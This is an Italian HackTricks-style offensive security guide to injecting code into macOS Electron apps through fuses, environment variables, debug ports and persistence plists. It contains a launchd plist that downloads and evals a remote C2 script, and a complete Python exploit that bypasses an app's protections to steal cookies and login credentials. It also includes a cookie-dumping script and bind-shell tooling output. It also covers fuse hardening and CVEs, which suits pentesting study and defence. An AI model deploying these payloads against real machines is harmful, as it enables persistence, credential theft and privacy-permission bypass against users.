# Injection di applicazioni Electron su macOS

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni di base

Se non sai cosa sia Electron, puoi trovare [**molte informazioni qui**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Ma per ora ti basta sapere che Electron esegue **node**.\
E node dispone di alcuni **parametri** e **variabili d'ambiente** che possono essere utilizzati per **fargli eseguire altro codice**, oltre al file indicato.

### Electron Fuses

Queste tecniche verranno discusse di seguito, ma negli ultimi tempi Electron ha aggiunto diversi **flag di sicurezza per impedirle**. Questi sono gli [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) e questi sono quelli utilizzati per **impedire** alle app Electron su macOS di **caricare codice arbitrario**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: se disabilitato, impedisce l'utilizzo della variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** per iniettare codice.
- **`EnableNodeCliInspectArguments`**: se disabilitato, parametri come `--inspect` e `--inspect-brk` non verranno rispettati, impedendo in questo modo di iniettare codice.
- **`EnableEmbeddedAsarIntegrityValidation`**: se abilitato, il **file** **`asar`** caricato verrà **convalidato** da macOS, **impedendo** in questo modo l'**iniezione di codice** modificando il contenuto di questo file.
- **`OnlyLoadAppFromAsar`**: se abilitato, invece di cercare i file da caricare nel seguente ordine: **`app.asar`**, **`app`** e infine **`default_app.asar`**, controllerà e utilizzerà solo app.asar, garantendo così che, quando **combinato** con il fuse **`embeddedAsarIntegrityValidation`**, sia **impossibile** **caricare codice non convalidato**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: se abilitato, il processo browser utilizza il file chiamato `browser_v8_context_snapshot.bin` per il suo snapshot V8.

Un altro fuse interessante che non impedisce l'iniezione di codice è:

- **EnableCookieEncryption**: se abilitato, il cookie store sul disco viene crittografato utilizzando chiavi crittografiche a livello di sistema operativo.

### Controllo degli Electron Fuses

Puoi **controllare questi flag** da un'applicazione con:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Come indicato nella [**documentazione**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configurazione degli **Electron Fuses** si trova all'interno del **binario Electron**, che contiene da qualche parte la stringa **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

Nelle applicazioni macOS, si trova generalmente in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Puoi caricare questo file in [https://hexed.it/](https://hexed.it/) e cercare la stringa precedente. Dopo questa stringa puoi vedere in ASCII un numero "0" o "1" che indica se ogni fuse è disabilitato o abilitato. Modifica semplicemente il codice esadecimale (`0x30` è `0` e `0x31` è `1`) per **modificare i valori dei fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Nota che se provi a **sovrascrivere** il **binary `Electron Framework`** all'interno di un'applicazione con questi byte modificati, l'app non verrà eseguita.

## RCE: aggiunta di codice alle Electron Applications

Potrebbero esserci **file JS/HTML esterni** utilizzati da una Electron App, quindi un attacker potrebbe iniettare codice in questi file, la cui signature non verrà verificata, ed eseguire codice arbitrario nel contesto dell'app.

> [!CAUTION]
> Tuttavia, al momento ci sono 2 limitazioni:
>
> - Il permesso **`kTCCServiceSystemPolicyAppBundles`** è **necessario** per modificare un'App, quindi per impostazione predefinita questo non è più possibile.
> - Il file compilato **`asap`** di solito ha i fuse **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** **abilitati**
>
> Rendendo questo attack path più complicato (o impossibile).

Nota che è possibile bypassare il requisito di **`kTCCServiceSystemPolicyAppBundles`** copiando l'applicazione in un'altra directory (come **`/tmp`**), rinominando la cartella **`app.app/Contents`** in **`app.app/NotCon`**, **modificando** il file **asar** con il tuo codice **malicious**, rinominandola nuovamente in **`app.app/Contents`** ed eseguendola.<sup>[[5]](#references)</sup>

Puoi estrarre il codice dal file asar con:
```bash
npx asar extract app.asar app-decomp
```
E ricomprimilo dopo averlo modificato con:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE con ELECTRON_RUN_AS_NODE

Secondo [**la documentazione**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), se questa variabile d'ambiente è impostata, avvierà il processo come un normale processo Node.js.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Se il fuse **`RunAsNode`** è disabilitato, la variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** verrà ignorata e questo non funzionerà.

### Injection dal Plist dell'app

Come [**proposto qui**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), potresti abusare di questa variabile d'ambiente in un plist per mantenere la persistence:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE con `NODE_OPTIONS`

Puoi archiviare il payload in un file diverso ed eseguirlo:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Se il fuse **`EnableNodeOptionsEnvironmentVariable`** è **disabilitato**, l'app **ignorerà** la env var **NODE_OPTIONS** quando viene avviata, a meno che la env var **`ELECTRON_RUN_AS_NODE`** non sia impostata; anche questa verrà **ignorata** se il fuse **`RunAsNode`** è disabilitato.
>
> Se non imposti **`ELECTRON_RUN_AS_NODE`**, verrà visualizzato l'**errore**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection dal Plist dell'app

Puoi abusare di questa env var in un plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE con inspecting

Secondo [**questo**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), se esegui un'applicazione Electron con flag come **`--inspect`**, **`--inspect-brk`** e **`--remote-debugging-port`**, sarà aperta una **porta di debug** a cui potrai connetterti (ad esempio da Chrome tramite `chrome://inspect`) e potrai **iniettare codice** al suo interno o persino avviare nuovi processi.<sup>[[7]](#references)</sup>\
Ad esempio:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**questo blogpost**](https://hackerone.com/reports/1274695), questo debugging viene abusato per fare in modo che un **headless chrome scarichi file arbitrari in posizioni arbitrarie**.<sup>[[8]](#references)</sup>

> [!TIP]
> Se un'app ha un metodo personalizzato per verificare se sono impostate variabili d'ambiente o parametri come `--inspect`, puoi provare a **bypassarlo** durante il runtime usando l'arg `--inspect-brk`, che **interromperà l'esecuzione** all'inizio dell'app ed eseguirà un bypass (sovrascrivendo, ad esempio, gli argomenti o le variabili d'ambiente del processo corrente).

Di seguito è riportato un exploit con cui, monitorando ed eseguendo l'app con il parametro `--inspect-brk`, era possibile bypassare la protezione personalizzata che aveva (sovrascrivendo i parametri del processo per rimuovere `--inspect-brk`) e quindi iniettare un payload JS per estrarre cookie e credenziali dall'app:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Se il fuse **`EnableNodeCliInspectArguments`** è disabilitato, l'app **ignorerà i parametri node** (come `--inspect`) all'avvio, a meno che la variabile d'ambiente **`ELECTRON_RUN_AS_NODE`** non sia impostata, e verrà anch'essa **ignorata** se il fuse **`RunAsNode`** è disabilitato.
>
> Tuttavia, puoi comunque usare il **parametro Electron `--remote-debugging-port=9229`**, ma il payload precedente non funzionerà per eseguire altri processi.

Usando il parametro **`--remote-debugging-port=9222`**, è possibile sottrarre alcune informazioni dall'app Electron, come la **cronologia** (con comandi GET) o i **cookies** del browser (poiché vengono **decrittografati** all'interno del browser ed è disponibile un **endpoint JSON** che li restituisce).

Puoi imparare a farlo [qui](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) e [qui](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) e usare lo strumento automatico [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) o uno script semplice come:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection dal Plist dell'app

Potresti abusare di questa variabile d'ambiente in un plist per mantenere la persistenza aggiungendo queste chiavi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass sfruttando versioni precedenti

> [!TIP]
> Il demone TCC di macOS non controlla la versione eseguita dell'applicazione. Quindi, se **non puoi iniettare codice in un'applicazione Electron** con una delle tecniche precedenti, potresti scaricare una versione precedente dell'APP e iniettarvi codice, poiché continuerà a ottenere i privilegi TCC (a meno che Trust Cache non lo impedisca).

## Eseguire codice non JS

Le tecniche precedenti permettono di eseguire **codice JS all'interno del processo dell'applicazione Electron**. Tuttavia, ricorda che i **processi figli vengono eseguiti con lo stesso profilo sandbox** dell'applicazione padre ed **ereditano i suoi permessi TCC**.\
Pertanto, se vuoi abusare degli entitlements per accedere, ad esempio, alla fotocamera o al microfono, puoi semplicemente **eseguire un altro binario dal processo**.

## Vulnerabilità rilevanti di Electron per macOS (2023-2024)

### CVE-2023-44402 – Bypass dell'integrità ASAR

Electron ≤22.3.23 e diverse pre-release delle versioni 23-27 permettevano a un attaccante con accesso in scrittura alla cartella `.app/Contents/Resources` di bypassare i fuse `embeddedAsarIntegrityValidation` **e** `onlyLoadAppFromAsar`. Il bug consisteva in una *confusione del tipo di file* nel verificatore di integrità, che permetteva di caricare una **directory denominata `app.asar`** appositamente creata al posto dell'archivio validato; di conseguenza, qualsiasi JavaScript inserito in quella directory veniva eseguito all'avvio dell'applicazione. Pertanto, anche i vendor che avevano seguito le indicazioni di hardening e abilitato entrambi i fuse erano comunque vulnerabili su macOS.<sup>[[3]](#references)</sup>

Versioni di Electron corrette: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** e **27.0.0-alpha.7**. Gli attaccanti che individuano un'applicazione in esecuzione con una build precedente possono sovrascrivere `Contents/Resources/app.asar` con una directory propria per eseguire codice con gli entitlements TCC dell'applicazione.<sup>[[3]](#references)</sup>

### Cluster di CVE “RunAsNode” / “enableNodeCliInspectArguments” del 2024

A gennaio 2024, una serie di CVE (da CVE-2024-23738 a CVE-2024-23743) ha evidenziato che molte app Electron vengono distribuite con i fuse **RunAsNode** e **EnableNodeCliInspectArguments** ancora abilitati. Un attaccante locale può quindi riavviare il programma con la variabile d'ambiente `ELECTRON_RUN_AS_NODE=1` o con flag come `--inspect-brk`, trasformandolo in un processo Node.js *generico* ed ereditando tutti i permessi sandbox e TCC dell'applicazione.<sup>[[4]](#references)</sup>

Sebbene il team di Electron abbia contestato la classificazione come “critica” e abbia osservato che l'attaccante deve già disporre della possibilità di eseguire codice localmente, il problema rimane utile durante il post-exploitation perché trasforma qualsiasi bundle Electron vulnerabile in un binario *living-off-the-land* che può, ad esempio, leggere Contatti, Foto o altre risorse sensibili precedentemente concesse all'app desktop.<sup>[[4]](#references)</sup>

Indicazioni difensive dei maintainer di Electron:<sup>[[4]](#references)</sup>

* Disabilita i fuse `RunAsNode` e `EnableNodeCliInspectArguments` nelle build di produzione.
* Usa la nuova API **UtilityProcess** se l'applicazione necessita legittimamente di un processo Node.js helper, invece di riabilitare tali fuse.

## Iniezione automatica

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Lo strumento [**electroniz3r**](https://github.com/r3ggi/electroniz3r) può essere usato facilmente per **individuare le applicazioni electron vulnerabili** installate e iniettarvi codice. Questo strumento tenterà di usare la tecnica **`--inspect`**:<sup>[[5]](#references)</sup>

Devi compilarlo autonomamente e puoi usarlo in questo modo:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki è stato progettato per effettuare il backdoor di applicazioni Electron sostituendo i file JavaScript delle applicazioni con i file JavaScript di Command & Control di Loki.

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Injection in macOS tramite framework di terze parti - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Bypass dell'integrità ASAR tramite confusione del tipo di file (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Dichiarazione relativa alle CVE di 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing la privacy di macOS - Una nuova arma per il tuo Red Teaming - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Variabili d'ambiente | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Perché le applicazioni Electron non possono memorizzare i tuoi segreti in modo confidenziale: opzione --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Report HackerOne #1274695 - Il debugging di Electron sfruttato per scaricare file arbitrari](https://hackerone.com/reports/1274695)
- [9] [Le mani nel barattolo dei cookie: dumping dei cookie con la porta di remote debugging di Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugging dei fallimenti del cookie dumping con il remote debugger di Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
